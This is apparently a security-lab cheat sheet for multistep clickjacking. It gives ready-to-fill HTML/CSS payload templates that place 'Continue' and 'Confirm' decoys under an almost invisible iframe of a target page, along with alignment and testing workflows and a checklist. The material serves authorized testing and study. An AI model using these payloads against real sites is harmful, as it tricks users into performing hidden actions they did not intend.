# Multistep Clickjacking Payload

## Purpose

Payload template for testing an authorized target where a sensitive workflow requires multiple user interactions.

The technique uses multiple visible decoys positioned over corresponding controls inside the target iframe.

---

## Basic Payload

```html
<style>
    iframe {
        position: relative;
        width: 700px;
        height: 500px;
        opacity: 0.1;
        z-index: 2;
    }

    .decoy-one {
        position: absolute;
        top: 200px;
        left: 100px;
        z-index: 1;
    }

    .decoy-two {
        position: absolute;
        top: 300px;
        left: 100px;
        z-index: 1;
    }
</style>

<div class="decoy-one">Continue</div>

<div class="decoy-two">Confirm</div>

<iframe src="https://TARGET"></iframe>
```

---

# Final Payload

After verifying the complete interaction sequence and alignment:

```html
<style>
    iframe {
        position: relative;
        width: 700px;
        height: 500px;
        opacity: 0.0001;
        z-index: 2;
    }

    .decoy-one {
        position: absolute;
        top: 200px;
        left: 100px;
        z-index: 1;
    }

    .decoy-two {
        position: absolute;
        top: 300px;
        left: 100px;
        z-index: 1;
    }
</style>

<div class="decoy-one">Continue</div>

<div class="decoy-two">Confirm</div>

<iframe src="https://TARGET"></iframe>
```

---

# Attack Sequence

```text
Target Page
     ↓
Action 1
     ↓
Page State Changes
     ↓
Action 2
     ↓
Final Result
```

The decoys correspond to the target controls involved in the sequence.

---

# Generic Structure

```html
<div class="decoy-one">FIRST ACTION</div>

<div class="decoy-two">SECOND ACTION</div>

<iframe src="TARGET"></iframe>
```

Additional interactions can be represented with additional decoy elements when required by the authorized lab.

---

# Positioning

Each decoy requires its own position.

Example:

```css
.decoy-one {
    position: absolute;
    top: 200px;
    left: 100px;
}

.decoy-two {
    position: absolute;
    top: 300px;
    left: 100px;
}
```

The coordinates are target-specific and must be determined during testing.

---

# Alignment Workflow

Use:

```css
opacity: 0.1;
```

during development.

Then:

```text
Align Decoy 1
      ↓
Trigger Action 1
      ↓
Observe New Page State
      ↓
Align Decoy 2
      ↓
Verify Action 2
```

Only after the complete sequence works should the iframe be made effectively invisible.

---

# Page State

A multistep attack requires awareness of state changes.

For example:

```text
Initial State
    ↓
Button A

After First Click
    ↓
Button B
```

The position of the second target control must therefore be verified after the first interaction.

---

# Generic Template

```html
<style>
    iframe {
        position: relative;
        width: WIDTHpx;
        height: HEIGHTpx;
        opacity: OPACITY;
        z-index: 2;
    }

    .decoy-one {
        position: absolute;
        top: TOP1px;
        left: LEFT1px;
        z-index: 1;
    }

    .decoy-two {
        position: absolute;
        top: TOP2px;
        left: LEFT2px;
        z-index: 1;
    }
</style>

<div class="decoy-one">FIRST DECOY</div>

<div class="decoy-two">SECOND DECOY</div>

<iframe src="TARGET"></iframe>
```

---

# Testing Workflow

```text
Identify Multi-Step Workflow
        ↓
Identify Target Control 1
        ↓
Identify Target Control 2
        ↓
Confirm Frameability
        ↓
Create iframe
        ↓
Create Decoy 1
        ↓
Create Decoy 2
        ↓
Use Partial Opacity
        ↓
Test First Interaction
        ↓
Observe Page State
        ↓
Test Second Interaction
        ↓
Verify Complete Sequence
        ↓
Reduce Opacity
```

---

# Testing Checklist

```text
☐ Target is authorized
☐ Multi-step workflow identified
☐ First target control identified
☐ Second target control identified
☐ Page state changes documented
☐ Target page is frameable
☐ iframe created
☐ First decoy created
☐ Second decoy created
☐ Decoys correctly positioned
☐ First interaction verified
☐ Second interaction verified
☐ Complete sequence verified
☐ Final PoC tested
```

---

# Key Learning

Multistep clickjacking is more complex than a single-click attack because the target interface can change between interactions.

The important chain is:

```text
Interaction 1
      ↓
Target State Changes
      ↓
Interaction 2
      ↓
Final Action
```

Therefore, every step must be tested and aligned independently.